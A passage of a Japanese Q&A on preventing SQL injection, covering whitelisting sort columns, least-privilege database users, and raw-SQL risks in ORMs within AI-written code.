    Q5. 並べ替えの列名を利用者に選ばせたいとき、プレースホルダで渡せないのはなぜで、どう守りますか？

    プレースホルダに入れられるのは値だけで、列名や ASC/DESC のような SQL の構造部分には使えないからです。許可する列名・方向をコードに列挙した ホワイトリスト から選び、リストにない入力は既定値に置き換えます。

    Q6. プレースホルダを使っていれば、DB ユーザーの権限は管理者のままでもかまいませんか？

    かまいません、とは言えません。どこか1か所でもつなぎ漏れがあれば、管理者権限だと DROP やファイル書き出し（Web シェル設置）、OS コマンド実行まで被害が広がります。最小権限にしておけば、突破されても被害を限定できます。

    Q7. AI が書いたコードで ORM（DB を楽に扱う部品）を使っていれば、SQLインジェクションの心配はありませんか？

    ありません、とは言えません。ORM にも生の SQL を書ける機能があり、そこで値をテンプレート文字列などでつないでいれば同じ穴が開きます。「入力をつないで SQL を作っていないか」を確認します。
